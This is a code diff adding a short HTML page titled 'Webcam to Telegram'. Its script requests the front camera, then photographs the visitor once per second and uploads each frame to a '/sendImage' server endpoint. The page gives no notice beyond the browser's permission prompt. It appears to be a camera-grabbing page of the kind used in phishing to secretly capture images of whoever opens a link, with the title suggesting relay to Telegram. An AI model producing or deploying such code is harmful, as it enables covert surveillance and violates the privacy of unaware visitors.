@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Webcam to Telegram</title>
+</head>
+<body>
+    <canvas id="canvas" width="640" height="480"></canvas>
+    <script>
+const context = document.getElementById('canvas').getContext('2d');
+const video = document.createElement('video');
+let stream; // Объявляем переменную stream глобально
+
+function handleSuccess(s) {
+    stream = s; // Присваиваем stream полученный поток
+    video.srcObject = stream;
+    video.play();
+}
+
+
+function handleError(error) {
+    console.error('Ошибка доступа к камере:', error);
+    alert('Ошибка доступа к камере. Пожалуйста, разрешите доступ.');
+}
+
+async function takePicture() {
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const imageData = canvas.toDataURL('image/png');
+
+    try {
+        const response = await fetch('/sendImage', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ image: imageData })
+        });
+
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        console.log('Фото успешно отправлено!');
+    } catch (error) {
+        console.error('Ошибка отправки фото:', error);
+    }
+}
+
+if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(handleSuccess)
+        .catch(handleError);
+    setInterval(takePicture, 1000); // Отправка фото каждую секунду
+} else {
+    console.log('getUserMedia не поддерживается этим браузером.');
+}
+
+// Функция остановки потока видео (для корректного завершения)
+function stopStream() {
+  if (stream) {
+    const tracks = stream.getTracks();
+    tracks.forEach(track => track.stop());
+  }
+}
+
+window.addEventListener('beforeunload', stopStream); // Остановка потока перед закрытием страницы
+    </script>
+</body>
+</html>
